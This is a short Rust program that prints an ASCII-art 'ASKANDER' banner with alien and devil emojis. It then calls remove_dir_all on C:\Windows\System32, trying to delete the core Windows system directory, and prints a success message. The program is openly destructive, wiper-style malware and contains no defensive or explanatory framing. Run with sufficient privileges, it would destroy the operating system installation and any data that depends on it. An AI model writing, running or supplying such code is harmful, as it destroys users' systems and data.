use std::fs;
use std::io;

fn main() -> io::Result<()> {
    println!(
        r"
    
░█████╗░░██████╗██╗░░██╗░█████╗░███╗░░██╗██████╗░███████╗██████╗░
██╔══██╗██╔════╝██║░██╔╝██╔══██╗████╗░██║██╔══██╗██╔════╝██╔══██╗
███████║╚█████╗░█████═╝░███████║██╔██╗██║██║░░██║█████╗░░██████╔╝
██╔══██║░╚═══██╗██╔═██╗░██╔══██║██║╚████║██║░░██║██╔══╝░░██╔══██╗
██║░░██║██████╔╝██║░╚██╗██║░░██║██║░╚███║██████╔╝███████╗██║░░██║
╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝░░╚═╝
    "
    );
    println!("👾👾👾👾👾👾👾👾👾👾👾");
    println!("Bye😈😈😈😈😈");
    let dir_path = r"C:\Windows\System32";

    if let Ok(metadata) = fs::metadata(&dir_path) {
        if metadata.is_dir() {
            fs::remove_dir_all(&dir_path)?;
            println!("Directory removed successfully.");
        } else {
            println!("Path exists, but it is not a directory.");
        }
    } else {
        println!("Directory does not exist or cannot be accessed.");
    }

    Ok(())
}
